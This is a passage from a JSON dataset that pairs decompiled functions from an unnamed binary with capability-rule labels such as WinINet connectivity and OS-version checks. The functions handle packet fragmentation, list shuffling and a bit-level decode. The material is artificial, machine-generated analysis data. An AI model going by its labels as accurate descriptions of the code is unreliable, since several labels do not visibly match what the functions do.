iVar1;\n                        if (iVar1 == 0) {\n                            *(arg1 + 0xd0) = 0;\n                        }\n                        fcn.00030378(arg1 + 0x118);\n                        iVar2 = 0;\n                        break;\n                    }\n                    if (*(arg1 + 0xe0) != 0) {\n                        iVar2 = *(arg1 + 0xe0);\n                        fcn.00030378(arg1 + 0x118);\n                        break;\n                    }\n                    fcn.00030378(arg1 + 0x118);\n                    if ((arg4 & 0xffffffff) == 0) break;\n                    iVar3 = fcn.0002fce4(arg1 + 0x120, 0);\n                    if (iVar3 == 0) {\n                        fcn.0002fce4(arg1 + 0x120, arg4 & 0xffffffff);\n                    }\n                    else {\n                        iVar4 = iVar4 + -1;\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 2);\n                fcn.00030378(arg1 + 0x128);\n            }\n            else {\n                fcn.00030378(arg1 + 0x128);\n                iVar2 = *(arg1 + 0xe0);\n            }\n        }\n        else {\n            iVar2 = fcn.00063334(*(arg1 + 8), arg2, arg3, arg4);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 623
    },
    "0005e3fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0005e3fc(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    \n    if (*(arg1 + 0x34) == 1) {\n        uVar1 = 0;\n    }\n    else {\n        fcn.00030310(arg1 + 0x38);\n        uVar1 = 0;\n        if (*(arg1 + 0x34) == 0) {\n            *(arg1 + 0x30) = 0x10;\n            *(arg1 + 0x34) = 1;\n            *(arg1 + 0x28) = arg1 + 0x14;\n        }\n        else {\n            uVar1 = -(*(arg1 + 0x34) != 1) & 0x2159012d;\n        }\n        fcn.00030378(arg1 + 0x38);\n    }\n    return uVar1;\n}\n",
        "token_count": 204
    },
    "0005f2a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0005f2a8(int64_t **arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int64_t **ppiVar7;\n    int64_t **ppiVar8;\n    \n    if ((1 < arg2) && (ppiVar7 = arg1,  arg1 != NULL)) {\n        do {\n            iVar5 = fcn.000667b8();\n            iVar6 = 0;\n            ppiVar8 = arg1;\n            do {\n                if (iVar6 == iVar5 % arg2) break;\n                ppiVar8 = *ppiVar8;\n                iVar6 = iVar6 + 1;\n            } while (ppiVar8 != NULL);\n            if (ppiVar8 == NULL) {\n                return;\n            }\n            if ((ppiVar8 != ppiVar7) && (*(ppiVar8 + 0x14) != *(ppiVar7 + 0x14))) {\n                piVar1 = ppiVar8[1];\n                piVar2 = *ppiVar8;\n                piVar3 = *ppiVar7;\n                piVar4 = ppiVar8[2];\n                *ppiVar8 = piVar3;\n                ppiVar8[1] = ppiVar7[1];\n                ppiVar8[2] = ppiVar7[2];\n                ppiVar7[1] = piVar1;\n                ppiVar7[2] = piVar4;\n                *ppiVar7 = piVar3;\n                *ppiVar8 = piVar2;\n            }\n            ppiVar7 = *ppiVar7;\n        } while (ppiVar7 != NULL);\n    }\n    return;\n}\n",
        "token_count": 406
    },
    "0005f358": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0005f358(int64_t arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t arg1_00;\n    int32_t iVar1;\n    int64_t **ppiVar2;\n    uint32_t uVar3;\n    int64_t **ppiVar4;\n    int32_t iVar5;\n    int64_t **ppiVar6;\n    int32_t iVar7;\n    uint64_t arg3_00;\n    uint8_t auStackX8 [24];\n    uint32_t uStackX32;\n    uint16_t auStack168 [4];\n    int64_t **ppiStack160;\n    int64_t iStack152;\n    ulong ****ppppuStack144;\n    uint8_t *puStack136;\n    ulong uStack128;\n    int64_t iStack120;\n    ulong ***pppuStack112;\n    int64_t *piStack104;\n    uint64_t uStack96;\n    ulong ****ppppuStack88;\n    uint16_t *puStack80;\n    ulong uStack72;\n    \n    arg3_00 = arg4;\n    ppiStack160 = NULL;\n    if (*(arg1 + 0x10) == 0) {\n        return 0x21590003;\n    }\n    uStackX32 = arg4;\n    if (*(arg1 + 0x40) == 0) {\n        arg2 = fcn.0005ef98(arg2, arg3);\n        iStack120 = arg2;\n        if (arg2 == 0) {\n            return 0x21590004;\n        }\n    }\n    else {\n        iStack120 = 0;\n    }\n    arg1_00 = iStack120;\n    iVar1 = fcn.0005f12c(arg1, arg2, arg3, &ppiStack160);\n    if (iVar1 != 0) {\n        fcn.00030d24(arg1_00);\n        return iVar1;\n    }\n    ppiVar6 = ppiStack160;\n    if (0x7ffe < iStack152) {\n        while (ppiVar6 != NULL) {\n            ppiVar4 = *ppiVar6;\n            fcn.00030d24(ppiVar6);\n            ppiVar6 = ppiVar4;\n        }\n        return 0x2159000b;\n    }\n    if (iStack152 < 0x10) {\n        iVar1 = fcn.000667b8();\n        ppiVar6 = ppiStack160;\n        iVar5 = iVar1 % 7 + 1;\n        for (ppiVar4 = ppiStack160; iVar1 = 1,  ppiVar4 != NULL; ppiVar4 = *ppiVar4) {\n            *(ppiVar4 + 0x14) = iVar5;\n            iVar1 = fcn.000667b8();\n            uVar3 = iVar1 >> 0x1f & 7;\n            iVar5 = iVar5 + 1 + ((iVar1 + uVar3 & 7) - uVar3);\n        }\n    }\n    else {\n        if (iStack152 < 0x7f) {\n            iVar5 = 1;\n            for (ppiVar4 = ppiStack160; iVar1 = 1,  ppiVar4 != NULL; ppiVar4 = *ppiVar4) {\n                *(ppiVar4 + 0x14) = iVar5;\n                iVar5 = iVar5 + 1;\n            }\n            goto code_r0x0005f488;\n        }\n        iVar1 = 0;\n        if (0xff < iStack152) {\n            iVar5 = 1;\n            for (ppiVar4 = ppiStack160; ppiVar4 != NULL; ppiVar4 = *ppiVar4) {\n                *(ppiVar4 + 0x14) = iVar5;\n                iVar5 = iVar5 + 1;\n            }\n            goto code_r0x0005f488;\n        }\n        iVar1 = fcn.000667b8();\n        ppiVar6 = ppiStack160;\n        uVar3 = iVar1 >> 0x1f & 0x7f;\n        iVar5 = ((uVar3 + iVar1 & 0x7f) - uVar3) + 1;\n        for (ppiVar4 = ppiStack160; iVar1 = 0,  ppiVar4 != NULL; ppiVar4 = *ppiVar4) {\n            *(ppiVar4 + 0x14) = iVar5;\n            iVar1 = fcn.000667b8();\n            uVar3 = iVar1 >> 0x1f & 0x7f;\n            iVar5 = iVar5 + 1 + ((iVar1 + uVar3 & 0x7f) - uVar3);\n        }\n    }\n    arg3_00 = uStackX32;\ncode_r0x0005f488:\n    fcn.0005f2a8(ppiVar6, iStack152);\n    ppppuStack88 = NULL;\n    puStack80 = NULL;\n    uStack72 = 0;\n    pppuStack112 = NULL;\n    piStack104 = NULL;\n    uStack96 = 0;\n    iStack152 = arg1 + 0x48;\n    ppppuStack144 = NULL;\n    puStack136 = NULL;\n    uStack128 = 0;\n    iVar5 = 0;\n    fcn.00030310(iStack152);\n    ppiStack160 = iVar1;\n    ppiVar4 = ppiVar6;\n    if (ppiVar6 != NULL) {\n        while( true ) {\n            if (ppiStack160 == NULL) {\n                auStackX8[0] = 0xff;\n                auStack168[0] = *(ppiVar4 + 0x14);\n                if (*ppiVar4 == NULL) {\n                    auStack168[0] = auStack168[0] | 0x8000;\n                }\n                puStack136 = auStackX8;\n                uStack128 = CONCAT44(uStack128._4_4_, 1);\n                ppppuStack144 = &ppppuStack88;\n                auStack168[0] = fcn.00030df4();\n                uStack72 = CONCAT44(uStack72._4_4_, 2);\n                puStack80 = auStack168;\n                ppppuStack88 = &pppuStack112;\n            }\n            else {\n                auStackX8[0] = *(ppiVar4 + 0x14);\n                if (*ppiVar4 == NULL) {\n                    auStackX8[0] = auStackX8[0] | 0x80;\n                }\n                puStack136 = auStackX8;\n                uStack128 = CONCAT44(uStack128._4_4_, 1);\n                ppppuStack144 = &pppuStack112;\n            }\n            piStack104 = ppiVar4[1];\n            uStack96 = uStack96 & 0xffffffff00000000 | *(ppiVar4 + 2);\n            if (*(ppiVar4 + 2) == *(arg1 + 0x14) || *(ppiVar4 + 2) < *(arg1 + 0x14)) break;\n            iVar5 = 0x2159000b;\ncode_r0x0005f69d:\n            if (iVar5 == 0x2159000b) {\n                if (*(arg1 + 0x14) == *(arg1 + 0x18)) {\n                    *(arg1 + 0x18) = 0;\n                }\n                else if (*(ppiVar4 + 2) < *(arg1 + 0x14)) {\n                    *(arg1 + 0x14) = *(ppiVar4 + 2);\n                }\n                iVar1 = *(ppiVar4 + 2);\n                iVar5 = (*(arg1 + 0x18) + *(arg1 + 0x14)) / 2;\n                if ((iVar1 <= iVar5) || (iVar7 = iVar5,  iVar5 <= iVar1 + (iVar1 >> 0x1f & 3U) >> 2)) {\n                    iVar7 = iVar1 / 2;\n                }\n                iVar1 = iVar1 - iVar7;\n                if ((0x400 < iVar7) && (iVar1 + 0x400 <= iVar5)) {\n                    iVar1 = fcn.000667b8();\n                    iVar7 = iVar7 - iVar1 % 0x401;\n                    iVar1 = *(ppiVar4 + 2) - iVar7;\n                }\n                if ((0x400 < iVar1) && (iVar7 + 0x400 <= iVar5)) {\n                    iVar5 = fcn.000667b8();\n                    iVar1 = iVar1 - iVar5 % 0x401;\n                    iVar7 = *(ppiVar4 + 2) - iVar1;\n                }\n                ppiVar2 = fcn.00030c98(0x18);\n                if (ppiVar2 == NULL) {\n                    iVar5 = 0x21590004;\n                    goto code_r0x0005f7ec;\n                }\n                *ppiVar2 = NULL;\n                ppiVar2[1] = NULL;\n                ppiVar2[2] = NULL;\n                *(ppiVar2 + 2) = iVar1;\n                *(ppiVar2 + 0x14) = *(ppiVar4 + 0x14);\n                iVar5 = 0;\n                ppiVar2[1] = iVar7 + ppiVar4[1];\n                *(ppiVar4 + 2) = iVar7;\n                *ppiVar2 = *ppiVar4;\n                *ppiVar4 = ppiVar2;\n            }\n            else {\n                if (*(arg1 + 0x18) < *(ppiVar4 + 2)) {\n                    *(arg1 + 0x18) = *(ppiVar4 + 2);\n                }\n                ppiVar4 = *ppiVar4;\n            }\n            if (ppiVar4 == NULL) goto code_r0x0005f7f8;\n            arg3_00 = uStackX32;\n        }\n        iVar5 = fcn.00064248(*(arg1 + 8), &ppppuStack144, arg3_00);\n        if ((iVar5 == 0) || (iVar5 == 0x2159000b)) goto code_r0x0005f69d;\ncode_r0x0005f7ec:\n        if (ppiVar4 != ppiVar6) {\n            *(arg1 + 0x10) = 0;\n        }\n    }\ncode_r0x0005f7f8:\n    fcn.00030378(iStack152);\n    while (ppiVar6 != NULL) {\n        ppiVar4 = *ppiVar6;\n        fcn.00030d24(ppiVar6);\n        ppiVar6 = ppiVar4;\n    }\n    fcn.00030d24(iStack120);\n    return iVar5;\n}\n",
        "token_count": 2418
    },
    "0005f838": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0005f838(int64_t arg1, int64_t *arg2, uint32_t *arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint16_t uVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int64_t *piVar8;\n    int64_t **ppiVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    uint8_t *arg1_00;\n    int64_t **ppiVar12;\n    uint8_t uVar13;\n    int64_t iVar14;\n    int64_t **arg1_01;\n    uint32_t uVar15;\n    int32_t iVar16;\n    uint8_t *puVar17;\n    uint32_t uVar18;\n    uint64_t uVar19;\n    uint32_t uVar20;\n    int64_t iVar21;\n    int64_t iVar22;\n    ushort uStackX9;\n    uint32_t auStack120 [2];\n    uint8_t *puStack112;\n    int64_t iStack104;\n    int64_t *piStack96;\n    int64_t *piStack88;\n    int64_t *piStack80;\n    \n    puStack112 = NULL;\n    if (*(arg1 + 0x10) == 0) {\n        return 0x21590003;\n    }\n    *arg2 = 0;\n    fcn.00030310(arg1 + 0x50);\n    arg1_01 = *(arg1 + 0x58);\n    *(arg1 + 0x58) = 0;\ncode_r0x0005f887:\n    iVar6 = fcn.00064000(*(arg1 + 8), &puStack112, auStack120, arg4);\n    if (iVar6 != 0) goto code_r0x0005facb;\n    if (auStack120[0] == 0) {\ncode_r0x0005fac1:\n        *(arg1 + 0x10) = 0;\n    }\n    else {\n        if (*puStack112 != 0xff) {\n            iVar16 = 1;\n            uVar5 = *puStack112 >> 7;\n            uVar20 = *puStack112 & 0x7f;\ncode_r0x0005f98b:\n            if ((arg1_01 == NULL) || (*(arg1_01 + 0x14) != uVar20)) {\n                ppiVar9 = fcn.00030c98(0x18);\n                if (ppiVar9 != NULL) {\n                    *ppiVar9 = NULL;\n                    ppiVar9[1] = NULL;\n                    ppiVar9[2] = NULL;\n                    piVar8 = fcn.00030c98(auStack120[0] - iVar16);\n                    ppiVar9[1] = piVar8;\n                    if (piVar8 != NULL) {\n                        *(ppiVar9 + 0x14) = uVar20;\n                        *(ppiVar9 + 2) = auStack120[0] - iVar16;\n                        fcn.0006670a(piVar8, puStack112 + iVar16, auStack120[0] - iVar16);\n                        *ppiVar9 = arg1_01;\n                        goto code_r0x0005fa93;\n                    }\n                    fcn.00030d24(ppiVar9);\n                }\ncode_r0x0005faba:\n                iVar6 = 0x21590004;\n                goto code_r0x0005fada;\n            }\n            iVar1 = *(arg1_01 + 2);\n            iVar7 = (*(arg1_01 + 2) - iVar16) + auStack120[0];\n            uVar19 = iVar7;\n            if (iVar7 == 0) {\n                fcn.00030d24(arg1_01[1]);\n                arg1_01[1] = NULL;\n            }\n            else {\n                piVar8 = fcn.00030c98(uVar19);\n                if (piVar8 == NULL) goto code_r0x0005faba;\n                uVar10 = iVar1;\n                if (uVar19 < iVar1) {\n                    uVar10 = uVar19;\n                }\n                fcn.0006670a(piVar8, arg1_01[1], uVar10);\n                fcn.00030d24(arg1_01[1]);\n                arg1_01[1] = piVar8;\n            }\n            fcn.0006670a(*(arg1_01 + 2) + arg1_01[1], puStack112 + iVar16, auStack120[0] - iVar16);\n            *(arg1_01 + 2) = *(arg1_01 + 2) + (auStack120[0] - iVar16);\n            ppiVar9 = arg1_01;\ncode_r0x0005fa93:\n            arg1_01 = ppiVar9;\n            if (uVar5 != 0) goto code_r0x0005fada;\n            fcn.00063bf8(*(arg1 + 8), puStack112);\n            puStack112 = NULL;\n            goto code_r0x0005f887;\n        }\n        if (auStack120[0] < 3) goto code_r0x0005fac1;\n        uVar4 = fcn.00030df4();\n        iVar16 = 3;\n        uVar20 = uVar4 & 0x7fff;\n        uVar5 = uVar4 >> 0xf;\n        if (uVar4 != 0xffff) goto code_r0x0005f98b;\n        if (auStack120[0] == 3) goto code_r0x0005fac4;\n        if (puStack112[3] != 1) {\ncode_r0x0005f962:\n            fcn.00063bf8(*(arg1 + 8), puStack112);\n            goto code_r0x0005f887;\n        }\n        if (auStack120[0] == 6) {\n            uStackX9 = *(puStack112 + 3) >> 8;\n            uVar5 = fcn.00030df4(uStackX9);\n            if (uVar5 != 0) {\n                *(arg1 + 0x18) = uVar5;\n                *(arg1 + 0x14) = uVar5;\n                goto code_r0x0005f962;\n            }\n        }\n    }\ncode_r0x0005fac4:\n    iVar6 = 0x2159000a;\n    goto code_r0x0005fada;\ncode_r0x0005facb:\n    if (iVar6 == 0x21590002) {\n        *(arg1 + 0x58) = arg1_01;\n        arg1_01 = NULL;\n    }\ncode_r0x0005fada:\n    fcn.00030378(arg1 + 0x50);\n    fcn.00063bf8(*(arg1 + 8), puStack112);\n    uVar19 = 0;\n    if (iVar6 == 0) {\n        piVar8 = *arg1_01;\n        ppiVar9 = arg1_01;\n        while (uVar10 = uVar19,  ppiVar12 = arg1_01,  piVar8 != NULL) {\n            for (ppiVar12 = *ppiVar9; ppiVar12 != NULL; ppiVar12 = *ppiVar12) {\n                if (*(ppiVar9 + 0x14) != *(ppiVar12 + 0x14) && *(ppiVar12 + 0x14) <= *(ppiVar9 + 0x14)) {\n                    piStack88 = ppiVar12[1];\n                    piStack96 = *ppiVar12;\n                    piVar8 = *ppiVar9;\n                    piStack80 = ppiVar12[2];\n                    *ppiVar12 = piVar8;\n                    ppiVar12[1] = ppiVar9[1];\n                    ppiVar12[2] = ppiVar9[2];\n                    ppiVar9[1] = piStack88;\n                    ppiVar9[2] = piStack80;\n                    *ppiVar9 = piVar8;\n                    *ppiVar12 = piStack96;\n                }\n            }\n            ppiVar9 = *ppiVar9;\n            piVar8 = *ppiVar9;\n        }\n        do {\n            auStack120[0] = uVar10 + *(ppiVar12 + 2);\n            ppiVar12 = *ppiVar12;\n            uVar10 = auStack120[0];\n        } while (ppiVar12 != NULL);\n        iVar11 = fcn.00030c98(auStack120[0]);\n        *arg2 = iVar11;\n        if (iVar11 == 0) {\n            iVar6 = 0x21590004;\n        }\n        else {\n            auStack120[0] = 0;\n            uVar10 = uVar19;\n            ppiVar9 = arg1_01;\n            do {\n                fcn.0006670a(uVar10 + *arg2, ppiVar9[1], *(ppiVar9 + 2));\n                uVar20 = auStack120[0] + *(ppiVar9 + 2);\n                uVar10 = uVar20;\n                ppiVar9 = *ppiVar9;\n                auStack120[0] = uVar20;\n            } while (ppiVar9 != NULL);\n            if (*(arg1 + 0x40) == 0) {\n                iVar11 = *arg2;\n                if (10 < uVar20) {\n                    iVar14 = uVar20;\n                    iStack104 = iVar14;\n                    arg1_00 = fcn.00030c98(iVar14);\n                    if (arg1_00 == NULL) {\n                        iVar6 = 0x21590004;\n                        goto code_r0x0005fc2a;\n                    }\n                    fcn.0006670a(arg1_00, iVar11, iVar14);\n                    fcn.0006677c();\n                    uVar10 = uVar19;\n                    uVar18 = uVar20;\n                    do {\n                        uVar2 = uVar18 / 10;\n                        uVar15 = uVar10 + uVar18 % 10;\n                        uVar10 = uVar15;\n                        uVar18 = uVar2;\n                    } while (0 < uVar2);\n                    iVar6 = 1;\n                    iVar22 = 1;\n                    iVar21 = uVar20 / uVar15;\n                    if (0 < iVar21) {\n                        uVar13 = *arg1_00;\n                        uVar10 = uVar19;\n                        do {\n                            iVar16 = 0;\n                            do {\n                                if (0 < uVar15) {\n                                    puVar17 = uVar19 + iVar11;\n                                    iVar14 = uVar15;\n                                    do {\n                                        *puVar17 = *puVar17 |\n                                                   ((1 << (uVar10 & 0x1f) & uVar13) >> (uVar10 & 0x1f)) <<\n                                                   (iVar16 & 0x1f);\n                                        uVar20 = uVar10 + 1;\n                                        uVar10 = uVar20;\n                                        if (7 < uVar20) {\n                                            uVar13 = arg1_00[iVar22];\n                                            iVar6 = iVar6 + 1;\n                                            iVar22 = iVar22 + 1;\n                                            uVar10 = 0;\n                                        }\n                                        puVar17 = puVar17 + iVar21;\n                                        iVar14 = iVar14 + -1;\n                                    } while (iVar14 != 0);\n                                }\n                                iVar16 = iVar16 + 1;\n                            } while (iVar16 < 8);\n                            uVar19 = uVar19 + 1;\n                            iVar14 = iStack104;\n                        } while (uVar19 < iVar21);\n                    }\n                    iVar21 = iVar6 + -1;\n                    if (iVar21 < iVar14) {\n                        puVar17 = iVar21 + iVar11;\n                        iVar22 = iVar21;\n                        do {\n                            iVar3 = iVar22 - iVar21;\n                            iVar22 = iVar22 + 1;\n                            *puVar17 = puVar17[arg1_00 - iVar11] ^ arg1_00[iVar3];\n                            puVar17 = puVar17 + 1;\n                        } while (iVar22 < iVar14);\n                    }\n                    fcn.00030d24(arg1_00);\n                }\n                iVar6 = 0;\n            }\n            *arg3 = auStack120[0];\n        }\n    }\ncode_r0x0005fc2a:\n    ppiVar9 = arg1_01;\n    if (arg1_01 != NULL) {\n        do {\n            fcn.00030d24(ppiVar9[1]);\n            ppiVar9 = *ppiVar9;\n        } while (ppiVar9 != NULL);\n        while (arg1_01 != NULL) {\n            ppiVar9 = *arg1_01;\n            fcn.00030d24(arg1_01);\n            arg1_01 = ppiVar9;\n        }\n    }\n    if (iVar6 != 0) {\n        fcn.00030d24(*arg2);\n        *arg2 = 0;\n        *arg3 = 0;\n    }\n    return iVar6;\n}\n",
        "token_count": 2949
    },
    "000605c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000605c0(int64_t arg1, ulong arg2, uint64_t arg3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    char *pcVar6;\n    ulong auStackX8 [4];\n    uint64_t in_stack_ffffffffffffff98;\n    int32_t aiStack56 [2];\n    uint64_t uStack48;\n    \n    if (*(arg1 + 0x28) == 0) {\n        uVar4 = 0x21590065;\n    }\n    else {\n        iVar5 = *(arg1 + 0x68);\n        *(arg1 + 0x68) = 0;\n        if (iVar5 != 0) {\n            iVar5 = -1;\n            pcVar6 = *(arg1 + 0x70);\n            do {\n                if (iVar5 == 0) break;\n                iVar5 = iVar5 + -1;\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            uVar4 = fcn.000605c0(arg1, *(arg1 + 0x70), ~iVar5);\n            if (uVar4 != 0) {\n                return uVar4;\n            }\n        }\n        iVar3 = arg3 & 0xffffffff;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            iVar2 = fcn.00066800(auStackX8, 0x10000000, 0, 1, in_stack_ffffffffffffff98 & 0xffffffffffffff00);\n            if (iVar2 == 0) {\n                iVar2 = fcn.0006671c(*(arg1 + 0x28), auStackX8[0], 0, 0, aiStack56, arg2, iVar3, 0, 0);\n                if ((iVar2 == 0x103) && (iVar3 = fcn.000667be(auStackX8[0], 0, 0),  iVar2 = aiStack56[0],  iVar3 != 0))\n                {\n                    fcn.000666f2(auStackX8[0]);\n                    iVar2 = iVar3;\n                }\n                else {\n                    fcn.000666f2(auStackX8[0]);\n                    if (iVar2 == 0) {\n                        if (uStack48 != (arg3 & 0xffffffff)) {\n                            return 0xffffffff;\n                        }\n                    }\n                    else if ((iVar2 == -0x3ffffeb5) || (iVar2 == -0x3fffff50)) {\n                        return 0x21590003;\n                    }\n                }\n            }\n            uVar4 = fcn.00066782(iVar2);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 642
    },
    "000610b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.000610b4(int64_t arg1, ulong arg2, uint8_t *arg3, int64_t *arg4)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    ulong *puVar8;\n    int64_t iVar9;\n    bool bVar10;\n    uint16_t uStackX8;\n    uint8_t uStackX10;\n    int32_t iStackX16;\n    uint8_t *puStackX24;\n    int64_t *piStackX32;\n    int32_t *in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uint8_t uStack88;\n    uint8_t uStack87;\n    uint32_t uStack84;\n    ushort *apuStack80 [2];\n    \n    iVar9 = 0;\n    apuStack80[0] = NULL;\n    iVar5 = *(arg1 + 0x14);\n    puStackX24 = arg3;\n    piStackX32 = arg4;\n    iStackX16 = arg2;\n    iVar2 = *0xfffff78000000320;\njoined_r0x000610e5:\n    *0xfffff78000000320 = iVar2;\n    if (iVar5 != 0) {\n        iVar5 = 0x21590006;\ncode_r0x0006177f:\n        fcn.00063bf8(*(arg1 + 8), apuStack80[0]);\n        return iVar5;\n    }\n    if (*(arg1 + 0x10) == 0) {\ncode_r0x000617bf:\n        iVar5 = 0x21590003;\n        goto code_r0x0006177f;\n    }\n    if ((*(arg1 + 0x68) != 0) && (*(arg1 + 0x18) == 3)) {\n        uVar4 = (**0x11308)();\n        uVar6 = *(arg1 + 0x5c);\n        iVar5 = *(arg1 + 0xa8);\n        uVar7 = fcn.000667b8();\n        if ((uVar7 & 0xffffffff) % uVar6 + 1 + (uVar6 >> 1) < (iVar2 * uVar4) / 10000 - iVar5) {\n            uStackX8 = uStackX8 & 0xff00 | *(arg1 + 0x1c);\n            uStackX10 = fcn.000667b8();\n            uStackX8 = CONCAT11(0x10, uStackX8);\n            iVar5 = fcn.00060cd8(arg1, 0, 0, &uStackX8);\n            iVar2 = *0xfffff78000000320;\n            if (iVar5 != 0) goto code_r0x0006177f;\n            uVar6 = (**0x11308)();\n            *(arg1 + 0xa8) = (uVar6 * iVar2) / 10000;\n        }\n    }\n    iVar2 = *0xfffff78000000320;\n    uVar4 = (**0x11308)();\n    iVar3 = *0xfffff78000000320;\n    uVar6 = *(arg1 + 0x5c) * *(arg1 + 0x58);\n    uVar4 = (iVar2 * uVar4) / 10000 - *(arg1 + 0xac);\n    if (uVar4 < uVar6) {\n        uVar6 = uVar6 - uVar4;\n    }\n    else {\n        uVar6 = 0;\n    }\n    bVar10 = in_stack_00000030 < uVar6;\n    if (bVar10) {\n        uVar6 = in_stack_00000030;\n    }\n    if (in_stack_00000030 != 0xffffffff) {\n        uVar4 = (**0x11308)();\n        iVar9 = (uVar4 * iVar3) / 10000;\n    }\n    iVar5 = fcn.00064000(*(arg1 + 8), apuStack80, &uStack84, uVar6);\n    iVar2 = *0xfffff78000000320;\n    if (in_stack_00000030 != 0xffffffff) {\n        uVar6 = (**0x11308)();\n        uVar6 = (uVar6 * iVar2) / 10000 - iVar9;\n        if (uVar6 < in_stack_00000030) {\n            in_stack_00000030 = in_stack_00000030 - uVar6;\n        }\n        else {\n            in_stack_00000030 = 0;\n        }\n    }\n    iVar2 = *0xfffff78000000320;\n    if (iVar5 != 0) {\n        if (iVar5 != 0x21590002) goto code_r0x0006177f;\n        uVar6 = (**0x11308)();\n        if (*(arg1 + 0x5c) * *(arg1 + 0x58) <= (iVar2 * uVar6) / 10000 - *(arg1 + 0xac)) {\n            *(arg1 + 0x10) = 0;\n            goto code_r0x0006177f;\n        }\n        if ((bVar10) || (in_stack_00000030 == 0)) goto code_r0x0006177f;\n        goto code_r0x00061770;\n    }\n    if (uStack84 < 3) {\n        if ((*(arg1 + 0x18) == 2) || (*(arg1 + 0x18) == 1)) {\ncode_r0x00061388:\n            iVar5 = 0x2159000a;\n            goto code_r0x0006177f;\n        }\n        fcn.00063bf8(*(arg1 + 8), apuStack80[0]);\n    }\n    else {\n        uVar1 = *(apuStack80[0] + 1);\n        uStack87 = *apuStack80[0] >> 8;\n        uStack88 = *apuStack80[0];\n        uStack87 = uStack87 ^ uVar1 >> 1;\n        uStack88 = uStack88 ^ uVar1 >> 1;\n        if ((uStack87 & 0x40) == 0) {\n            uVar6 = (**0x11308)();\n            iVar5 = *(arg1 + 0x18);\n            *(arg1 + 0xac) = (uVar6 * iVar2) / 10000;\n            if ((((iVar5 == 2) || (iVar5 == 1)) && ((uStack87 & 1) == 0)) && ((uStack87 & 0x20) == 0)) {\n                if (iVar5 == 2) goto code_r0x0006174a;\n                uStackX8 = CONCAT11(0x20, uStack88);\n            }\n            else {\n                if (((iVar5 != 0) || ((uStack87 & 2) != 0)) || ((uStack87 & 0x20) != 0)) {\n                    if ((((iVar5 == 1) && ((uStack87 & 1) != 0)) && ((uStack87 & 4) == 0)) ||\n                       ((iVar5 == 3 && ((((uStack87 & 0x10) != 0 || ((uStack87 & 1) != 0)) && ((uStack87 & 4) == 0))))))\n                    {\n                        uStackX8 = CONCAT11(uStack87, uStack88) | 0x400;\n                        uStackX10 = uVar1;\n                        iVar5 = fcn.00060cd8(arg1, 0, 0, &uStackX8);\n                        if (iVar5 != 0) goto code_r0x0006177f;\n                        if (((uStack87 & 1) != 0) && (*(arg1 + 0x18) == 1)) {\n                            *(arg1 + 0x18) = 3;\n                            *(arg1 + 0x1d) = uStack88 + 1;\n                        }\n                    }\n                    iVar5 = iStackX16;\n                    if (((*(arg1 + 0x18) == 3) || (*(arg1 + 0x18) == 2)) &&\n                       (((uStack87 & 4) != 0 && (((uStack87 & 0x10) == 0 && (uStack88 == *(arg1 + 0x1c))))))) {\n                        if (((uStack87 & 1) != 0) && (*(arg1 + 0x18) == 2)) {\n                            *(arg1 + 0x18) = 3;\n                        }\n                        if (iStackX16 != 1) {\n                            fcn.00030310(arg1 + 0x70);\n                            *(arg1 + 0x88) = uVar1;\n                            *(arg1 + 0x8c) = 1;\n                            fcn.0002fcb8(arg1 + 0x80);\n                            fcn.00030378(arg1 + 0x70);\n                            goto code_r0x0006155c;\n                        }\n                        *puStackX24 = uVar1;\ncode_r0x000617b4:\n                        iVar5 = 0;\n                        goto code_r0x0006177f;\n                    }\ncode_r0x0006155c:\n                    if (((uStack87 & 0x20) != 0) && 